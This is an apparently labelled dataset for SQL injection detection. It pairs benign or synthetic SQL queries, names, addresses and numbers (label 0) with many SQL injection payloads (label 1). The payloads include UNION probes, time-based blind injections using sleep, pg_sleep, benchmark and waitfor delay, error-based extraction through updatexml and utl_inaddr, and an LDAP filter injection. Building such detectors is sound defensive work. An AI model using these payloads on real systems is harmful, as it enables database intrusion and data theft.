payload	label
SELECT AVG ( mighty ) FROM company	0
SELECT AVG ( molecular )  FROM week  SELECT SUM ( everywhere ) 	0
SELECT * FROM measure WHERE too = 'beginning' FETCH FIRST 3 ROWS ONLY	0
rincn	0
"1%""  )   union all select null--"	1
SELECT second	0
1 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   # pkcp	1
SELECT * FROM list WHERE tin = 'toy'	0
1'+  (  select tafk where 9652  =  9652	1
germe	0
" end and    (    (   ""kvts"" like ""kvts"	1
SELECT * FROM spite WHERE standard BETWEEN 'base' AND 'solve'	0
select * from generate_series  (  6414,6414,case when   (  6414  =  6455  )   then 1 else 0 end  )   limit 1--	1
-6030%'  )   or 3038  =  3038	1
select   (  case when   (  1898  =  4705  )   then 1898 else 1/  (  select 0  )   end  )  --	1
"SELECT * FROM between WHERE immediately BETWEEN ""vapor"" AND    ""national"""	0
"-8034""  )   where 1292  =  1292 union all select 1292,1292,1292,1292,1292#"	1
SELECT TOP 50 PERCENT * FROM popular	0
SELECT * FROM reach WHERE happen = 'design'  AND City = 'signal'	0
1'   )    )    as qwdh where 7581  =  7581 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --	1
05072293b	0
SELECT TOP 3 * FROM question SELECT * FROM gate 3SELECT * FROM goose	0
SELECT * FROM most  WHERE or = talk	0
SELECT AVG ( basis ) FROM broke SELECT SUM ( rule ) 	0
 SELECT column_name ( s )  FROM share,sound	0
SELECT TOP 50 PERCENT * FROM box SELECT * FROM fellow FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM chemical	0
SELECT * FROM stop WHERE chart NOT LIKE '[cutting]%'	0
-1598   )    )     )   union all select 9418,9418,9418,9418,9418,9418,9418#	1
3o7za732	0
1'  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  'adjc'  =  'adjc	1
SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 55203 )  ORDER BY meta_id ASC	0
 select * from users where id  =  1 or @`\` union select 1,version  (    )   -- 1	1
3350000000000000	0
37425321c	0
SELECT AVG ( rubbed ) FROM original	0
1'+  (  select 'ples' where 4244  =  4244 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'	1
  SELECT Orders.shadowrID, Employees.becoming, Employees.please FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.seeID ORDER BY Orders.nestID	0
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i	1
SELECT * FROM such WHERE brought IN  ( SELECT brief FROM certain ) 	0
1%' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '	1
DELETE FROM lead WHERE thus = 'trouble'	0
SELECT pour ( s )  FROM political FULL OUTER JOIN	0
SELECT * FROM important WHERE hour = 'increase' LIMIT 3	0
1 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  	1
torrente zaldvar	0
1%'  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  '%'  =  '	1
1'   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'novq'  =  'novq	1
*  (  |  (  mail  =  *   )    ) 	1
fontanal callarisa	0
SELECT review FROM told UNION SELECT sand FROM studying ORDER BY single	0
"1%""   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --"	1
SELECT * FROM fed WHERE lion = 'cowboy' LIMIT 3	0
oestreic	0
"1%""   )    )     )   union all select null,null,null,null,null,null,null--"	1
7743	0
FROM  ( SELECT DISTINCT sale FROM search ) 	0
 SELECT * FROM review ORDER BY told ASC, worth DESC	0
1'+  (  select 'rqok' where 5074  =  5074 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  +'	1
1' in boolean mode  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  #	1
kingston@professionalhost.com.ag	0
  SELECT articleID AS ID, planning AS thousand FROM related	0
SELECT * FROM silver  WHERE date NOT LIKE '[probably]%'	0
select   (  case when   (  6276  =  6276  )   then 6276 else 6276*  (  select 6276 from information_schema.character_sets  )   end  )  #	1
"1""   )    )    as nbdc where 4444  =  4444 union all select null,null--"	1
7057230000000000	0
SELECT aside ( s )  FROM master UNION	0
‘ or 3  =  3 --	1
pasaje cox 194, 5?f	0
"1""  )   as hoiv where 9708  =  9708 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --"	1
SELECT * FROM television WHERE yesterday NOT LIKE 'other%'	0
 SELECT * FROM mirror ORDER BY oil, captain	0
SELECT * FROM stepped FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM support	0
apolilladura	0
SELECT surprise ( s ) FROM examine INNER JOIN	0
SELECT * FROM entire WHERE    NOT sat = 'air'	0
1%' and 9127  =  7687--	1
SELECT limited ( s )  FROM found UNION ALL	0
-5327'   )    )     )   or 1606  =  6099	1
a' --	1
  SELECT hurryID AS ID, modern AS broke FROM stage	0
nobuo	0
pincel	0
SELECT MIN ( printed )  AS lips FROM is	0
SELECT importance ( s ) FROM earth INNER JOIN	0
SELECT * FROM flag WHERE worse = 'make' FETCH FIRST 3 ROWS ONLY	0
18243165w	0
  SELECT mostID AS ID, my AS principle FROM sheep	0
1'   )    )    as oocd where 2919  =  2919 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --	1
1%'  )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --	1
SELECT * FROM sport WHERE joy  BETWEEN 10 AND 20	0
"1"" or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ""bkrk""  =  ""bkrk"	1
mary-ann	0
1   )    )    as pxmz where 2596  =  2596	1
1'||  (  select 'asfl' from dual where 5846  =  5846 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --	1
portelan9	0
sonoe	0
SELECT * FROM together WHERE birthday IN  ( SELECT location FROM entire ) 	0
katsuno@novolardiseno.br	0
SELECT * FROM  ( SELECT bit FROM bet ) 	0
SELECT cloth FROM kept	0
 SELECT * FROM quietly ORDER BY myself ASC, beneath DESC	0
ad5ma.sc9r	0
1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   	1
calle arins 87 4?e	0
-5417 or elt  (  1032  =  1032,3623  )  	1
SELECT * FROM simply ORDER BY desk DESC	0
seno	0
SELECT COUNT ( dawnID ) FROM block	0
"  SELECT TO_DAYS ( ""2017-06-20"" ) ;"	0
SELECT AVG ( perfectly ) FROM band	0
macedonia 48	0
   SELECT welcome,people,could,welcome,slowly     (  (  ship JOIN gentle ON than.page =  honor.sail )   INNER JOIN extraON Orders.blood =  shoot.ancientID ) 	0
SELECT easily FROM even	0
niel5	0
c/ ciudadela 188, 4?f	0
coderch gordo	0
calle bertran de castellet 28 6e	0
DELETE FROM engine WHERE size = 'straight'	0
1' and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'hstg' like 'hstg	1
zulmara	0
SELECT furniture FROM ants	0
SELECT * FROM also WHERE Price NOT BETWEEN 10 AND 20	0
wong@hiperespaa.ly	0
FROM  ( SELECT DISTINCT us FROM slabs ) 	0
SELECT * FROM fairly WHERE apartment = 'mine'  AND City = 'well'	0
   SELECT review, helpful, afternoonFROM enter WHERE poor  IS NOT NULL	0
   SELECT tip, half, drivingFROM physical WHERE usual  IS NOT NULL	0
1'+  (  select rhlb where 9477  =  9477	1
SELECT our ( s )  FROM square UNION ALL	0
1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #	1
SELECT * FROM  ( SELECT gradually FROM sharp ) 	0
1  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  	1
1084	0
jaraba villa	0
-3733'   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'ybgd'  =  'ybgd	1
 select * from users where id  =  1.&&@ union select 1,version  (    )   -- 1	1
"1%""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""%""  =  """	1
-9534%' or 3038  =  3038	1
00207473j	0
empentar	0
"1""  )   as rdvm where 6360  =  6360 and sleep  (  5  )  --"	1
SELECT * FROM  ( SELECT writing FROM in ) 	0
"1""   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #"	1
santa maria de corc	0
9.37032E+015	0
  SELECT taughtID AS ID, discovery AS steady FROM mainly	0
1'||  (  select 'alxi' where 3967  =  3967 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #	1
41100	0
adaiana	0
1   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --	1
SELECT meet ( s FROM steel RIGHT JOIN	0
81338514a	0
  SELECT skin,brass,smaller FROM dug LEFT JOIN Orders ON coast.neverID =  adjective.stronger ORDER BY chicken.two	0
sobrestante	0
yuraj	0
1%'  )   union all select null,null,null,null,null,null,null,null,null#	1
if  (  2643  =  1393  )   select 2643 else drop function nqss--	1
  SELECT Orders.activityrID, Employees.pony, Employees.castle FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.underlineID ORDER BY Orders.breakfastID	0
"1%""   )    )     )   union all select null,null,null,null,null,null#"	1
INSERT INTO unless ( by, chair, letter, porch, came, ready )  VALUES  ( 'lost', 'cause'. happy', 'swung', 'detail', 'being', 'needed' )  	0
SELECT hunter ( s )  FROM tea UNION	0
mong-tse	0
86274990n	0
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT banner FROM v$version WHERE ROWNUM  =  1   )    )    AND 'i'  =  'i	1
SELECT COUNT ( DISTINCT climate )  FROM direction	0
70243797a	0
SELECT TOP 3 * FROM discuss WHERE enjoy = 'needle' SELECT * FROM still	0
SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 11710 )  ORDER BY meta_id ASC	0
SELECT COUNT ( wooden )  FROM church	0
SELECT * FROM sell WHERE money = 'noted'	0
millot_power@guejos.sv	0
1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  	1
  SELECT daughter,plural,human FROM slept LEFT JOIN Orders ON business.layID =  too.beside ORDER BY slip.upon	0
"SELECT * FROM should WHERE electricity BETWEEN ""greater"" AND    ""impossible"""	0
SELECT * FROM movie WHERE cry BETWEEN 'shaking' AND 'since'	0
   SELECT wave, reason+ ', ' + produce+ ' ' + class+ ', ' + or AS behavior  FROM dawn	0
casado vallcorba	0
"1""   )    )    as yutu where 1306  =  1306 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --"	1
"1""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  ""ijag""  =  ""ijag"	1
1'+  (  select 'feof' where 1966  =  1966	1
1 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  -- btqa	1
1'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  'dtym'  =  'dtym	1
anamary	0
1  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --	1
2719	0
SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 185 )  ORDER BY meta_id ASC	0
1' and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and 'vunt'  =  'vunt	1
-5962   )    )    as jbqv where 2583  =  2583 or 7496  =  8560--	1
9.51518E+015	0
decacque	0
"1%""   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --"	1
septingentsima	0
SELECT lion ( s )  FROM list UNION	0
SELECT crack ( s ) FROM sport INNER JOIN	0
-9264'  )   or 8571  =  8571--	1
DELETE FROM possible WHERE kitchen = 'largest'	0
SELECT * FROM enemy WHERE printed NOT BETWEEN 'house' AND 'knew'	0
-4610'   )    )    or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   'hdco'  =  'hdco	1
SELECT * FROM spite FETCH FIRST 50 PERCENT ROWS ONLY	0
3500	0
fuentes calientes	0
carretera nacional 139, 9?a	0
  SELECT was AS family, visitor AS [seen]  FROM against	0
in8ros742tiva	0
c/ san antonio 65 12?a	0
SELECT * FROM rather WHERE tail = 'related'	0
"1"" or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""jtgs"" like ""jtgs"	1
  SELECT Orders.thusrID, Employees.yet, Employees.table FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.coverID ORDER BY Orders.deadID	0
SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28072 )  ORDER BY meta_id ASC	0
SELECT * FROM  ( SELECT now FROM depend ) 	0
  (  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  9339  =  9339  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   	1
SELECT * FROM individual WHERE situation NOT LIKE 'ship%'	0
SELECT flight ( s )  FROM means UNION ALL	0
1'+  (  select bptu where 7356  =  7356   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )      )    )   +'	1
INSERT INTO depth ( class, stuck, particles, sister, type, bell )  VALUES  ( 'swam', 'sick'. whatever', 'pleasant', 'foot', 'yesterday', 'wrong' )  	0
thuong	0
SELECT asleep ( s FROM usual RIGHT JOIN	0
-3756'  )   union all select 1034,1034,1034--	1
"1%""  )   and   (  6016  =  4763  )  *4763 and   (  ""%""  =  """	1
SELECT * FROM action WHERE broad = 'fight' LIMIT 3	0
SELECT * FROM nothing WHERE treated BETWEEN '1996-07-01' AND '1996-07-31'	0
SELECT TOP 3 * FROM against SELECT * FROM game 3SELECT * FROM popular	0
-9564 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ) 	1
SELECT * FROM greatly WHERE total = 'symbol' LIMIT 3	0
3549370000000000	0
2301580000000000	0
-1963 union all select 6831,6831,6831,6831,6831,6831,6831,6831#	1
"1""  )   where 9115  =  9115"	1
"-7139""  )   where 2723  =  2723 or 3900  =  5082--"	1
 select * from users where id  =  1 union select @<@$,version  (    )   -- 1	1
-9676 or elt  (  1032  =  1032,3623  )  # jcaq	1
50344	0
1'+  (  select 'leok' where 4320  =  4320	1
SELECT shelf ( s )  FROM kill	0
SELECT * FROM dig WHERE proud BETWEEN '1996-07-01' AND '1996-07-31'	0
prats de lluans	0
SELECT * FROM hand FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM identity	0
"-3782%""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""%""  =  """	1
SELECT * FROM invented WHERE raise BETWEEN band09/01/1996small AND people15/31/1996cross	0
SELECT * FROM struggle  WHERE tea = forest	0
select * from users where id  =  1 or \.<\ or 1  =  1 -- 1	1
7115660000000000	0
"1""   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --"	1
1   )    )    as cusv where 4871  =  4871 and elt  (  1210  =  1210,sleep  (  5   )    )   --	1
select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  '%'  =  '	1
DELETE FROM rubber WHERE how = 'dirty'	0
"-2959"" union all select 3414,3414,3414,3414,3414,3414,3414,3414#"	1
SELECT * FROM whose WHERE Price NOT BETWEEN 10 AND 20	0
1   )    )     )   union all select null,null,null,null,null,null,null,null,null--	1
1' and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and 'egye'  =  'egye	1
SELECT * FROM visitor  WHERE once = somewhere	0
1'  )   where 1804  =  1804 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #	1
37170	0
1'+  (  select 'yyyn' where 5395  =  5395	1
select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- ygbf	1
"1""   )    )    and elt  (  6553  =  4771,4771  )   and    (    (   ""eolu""  =  ""eolu"	1
 SELECT * FROM eat ORDER BY copper, dot	0
"-5027%""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""%""  =  """	1
select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  1321  =  1321	1
SELECT * FROM spin WHERE fence NOT LIKE '[master]%'	0
finca el jardinito, 155,	0
1' where 1557  =  1557	1
"-6928""   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   ""mxhr"" like ""mxhr"	1
 SELECT column_name ( s )  FROM finest,develop	0
select   (  case when   (  2140  =  5325  )   then 2140 else 2140*  (  select 2140 from information_schema.character_sets  )   end  )  #	1
SELECT * FROM  ( SELECT start FROM production ) 	0
SELECT * FROM doctor 3 SELECT * FROM lying	0
miremont@barnicesuv.th	0
"1""  )   where 6018  =  6018 and 7533  =  7533--"	1
DELETE FROM frighten WHERE ordinary = 'fine'	0
SELECT * FROM blind WHERE together = 'fresh'	0
-1510'   )    )     )   union all select 8755,8755,8755,8755,8755,8755,8755,8755,8755,8755--	1
1'   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   'oucg'  =  'oucg	1
orzuelo	0
1' where 4039  =  4039 union all select null,null,null,null,null,null,null,null--	1
  SELECT Orders.firstrID, Employees.limited, Employees.path FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.cityID ORDER BY Orders.fruitID	0
SELECT AVG ( complete ) FROM iron	0
-9622'   )    )     )   order by 1#	1
SELECT * FROM clothes WHERE Price NOT BETWEEN 10 AND 20	0
34491	0
"1"" where 6111  =  6111 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --"	1
"1"" and 7533  =  7533"	1
c/ virgen de la almudena, 61 12?c	0
ivonne	0
SELECT * FROM move 3	0
INSERT INTO gold ( twice, else, post, direct, favorite, wear )  VALUES  ( 'shelf', 'sum'. bent', 'merely', 'struggle', 'great', 'longer' )  	0
"1""  )   waitfor delay '0:0:5' and   (  ""vjpg""  =  ""vjpg"	1
SELECT * FROM rush ORDER BY important	0
12480	0
"-1504""  )   as wpes where 6256  =  6256 union all select 6256,6256,6256,6256,6256,6256,6256,6256,6256,6256#"	1
"SELECT SUBDATE ( ""2017-06-15 09:34:21"", INTERVAL 15 MINUTE ) ;"	0
SELECT airplane	0
"-5278""   )    )     )   union all select 5264,5264,5264#"	1
SELECT Count ( * )  AS small	0
SELECT AVG ( lying ) FROM be	0
SELECT COUNT ( earID ) FROM leave	0
SELECT column1 , column2 , ... FROM table_name WHERE condition ; CREATE VIEW [Brazil Customers] AS 	0
end and   (  9416  =  9416	1
42210	0
-2431'  )   or 8571  =  8571--	1
lurlene	0
SELECT AVG ( Price ) FROM angry	0
  SELECT * FROM bone WHERE ever NOT IN  ( 'planning', 'watch', 'label' )  	0
  SELECT without AS settle, her AS [mile]  FROM tip	0
" select * from users where id  =  1 or 1#"",  =  1 or 1  =  1 -- 1"	1
-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#	1
1' where 8860  =  8860 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --	1
SELECT * FROM  ( SELECT minute FROM lake ) 	0
SELECT drive ( s )  FROM rest SELECT roll ( s ) 	0
"1%""   )    )    or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --"	1
19127	0
46183	0
"1""  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""ureu"" like ""ureu"	1
  SELECT quick AS impossible, chance AS [ability]  FROM breakfast	0
1'  )   where 3861  =  3861	1
1'   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #	1
SELECT finest ( s )  FROM policeman	0
1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  'lajk'  =  'lajk	1
-4825%'  )   union all select 6804,6804,6804,6804,6804,6804,6804--	1
SELECT * FROM bean WHERE morning IN  ( SELECT find FROM selection ) 	0
SELECT TOP 50 PERCENT * FROM map SELECT * FROM shown FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM grown	0
-9583'   )    )    union all select 6392,6392,6392,6392,6392,6392,6392,6392,6392,6392#	1
-2197' union all select 8065,8065,8065,8065--	1
SELECT are ( s )  FROM exclaimed	0
1'||  (  select 'epjf' from dual where 8584  =  8584 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --	1
"1"" and 7533  =  7533 and ""btak"" like ""btak"	1
SELECT * FROM slope	0
1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'ozan'  =  'ozan	1
lemoine5@informatica2009.zr	0
1'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   'prjf'  =  'prjf	1
en8og1da	0
SELECT buy ( s )  FROM call UNION	0
magaz de pisuerga	0
biota	0
518985000000000	0
"-4745"" or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""nifq"" like ""nifq"	1
DELETE FROM satellites	0
84q42o	0
65472744r	0
14973109v	0
SELECT * FROM water ORDER BY service	0
SELECT * FROM silent WHERE cover IN  ( SELECT bet FROM bet ) 	0
lorraine	0
"1"" or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and ""uqor"" like ""uqor"	1
1  )   where 8008  =  8008 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --	1
SELECT column_name ( s ) FROM table1INNER JOIN	0
1   )    )    as vryv where 5600  =  5600	1
SELECT tea ( s ) FROM improve INNER JOIN	0
39960501w	0
1'  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  'ozef'  =  'ozef	1
1'||  (  select 'hfbt' where 7204  =  7204 union all select null,null,null,null,null,null,null,null,null,null--	1
84304826m	0
"1""  )   where 8571  =  8571 and elt  (  4249  =  4249,7259  )  --"	1
SELECT ate FROM sides UNION ALL SELECT want FROM proper ORDER BY aloud	0
masapati	0
8812120000000000	0
SELECT * FROM individual WHERE    NOT post = 'horn'	0
12466	0
SELECT TOP 3 * FROM rhythm SELECT * FROM purpose 3SELECT * FROM supply	0
